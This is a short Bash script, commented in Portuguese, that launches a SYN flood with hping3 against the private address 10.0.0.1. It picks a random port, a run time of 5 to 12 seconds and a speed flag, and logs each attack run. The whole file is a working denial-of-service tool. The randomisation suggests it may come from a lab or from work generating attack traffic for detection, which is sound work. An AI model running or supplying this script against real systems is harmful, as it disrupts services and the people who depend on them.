#!/bin/bash
# SYN Flood com variabilidade (porta, duração, intensidade)

TARGET="10.0.0.1"

# --- Variabilidade ---
# Porta aleatória entre 1 e 65535
PORT=$(shuf -i 1-65535 -n 1)

# Duração entre 5 e 12 segundos
DURATION=$(shuf -i 5-12 -n 1)

# Velocidade variável (--fast, --faster, --flood)
SPEED_MODES=("--fast")
SPEED=${SPEED_MODES[$RANDOM % ${#SPEED_MODES[@]}]}

# Arquivo de log
LOGFILE="syn_attack_$(date +%Y%m%d_%H%M%S).log"

echo "[INFO] Iniciando SYN flood"
echo "[INFO] Alvo: $TARGET" | tee -a "$LOGFILE"
echo "[INFO] Porta aleatória usada: $PORT" | tee -a "$LOGFILE"
echo "[INFO] Duração: $DURATION segundos" | tee -a "$LOGFILE"
echo "[INFO] Intensidade usada: $SPEED" | tee -a "$LOGFILE"

# --- Execução do ataque ---
hping3 -S -p "$PORT" $SPEED "$TARGET" 2>&1 | tee -a "$LOGFILE" &
HPID=$!

sleep "$DURATION"

# --- Encerrando ---
kill "$HPID" 2>/dev/null || true
pkill -f "hping3 -S -p $PORT" 2>/dev/null || true

echo "[INFO] Ataque encerrado." | tee -a "$LOGFILE"
